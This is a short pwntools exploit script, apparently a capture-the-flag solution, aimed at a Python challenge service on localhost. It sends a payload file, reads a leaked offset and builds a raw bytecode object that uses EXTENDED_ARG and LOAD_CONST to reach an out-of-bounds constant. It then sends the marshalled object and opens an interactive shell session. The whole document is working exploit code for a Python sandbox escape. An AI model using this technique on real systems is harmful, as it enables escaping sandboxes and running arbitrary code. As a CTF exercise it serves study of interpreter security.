from pwn import *
from types import CodeType
from dis import opmap
import marshal

with open("payload.py", "rb") as f:
    payload = f.read()

# io = process(["python", "chall.py"])
io = remote("localhost", 8764)
io.sendline(payload.replace(b"\n", b"\r"))

# possible to construct code object on remote
# but it is easier with `CodeType`...
io.recvuntil(b"Offset: ")
offset = int(io.recvlineS())
bc = bytes(
    [
        opmap["EXTENDED_ARG"],
        (offset >> 24) & 0xFF,
        opmap["EXTENDED_ARG"],
        (offset >> 16) & 0xFF,
        opmap["EXTENDED_ARG"],
        (offset >> 8) & 0xFF,
        opmap["LOAD_CONST"],
        (offset >> 0) & 0xFF,
        opmap["RETURN_VALUE"],
        0,
    ]
)
code = CodeType(0, 0, 0, 0, 0, 0, bc, (), (), (), "", "", 0, b"")
io.sendlineafter(b"hex: ", marshal.dumps(code).hex().encode())

io.interactive()
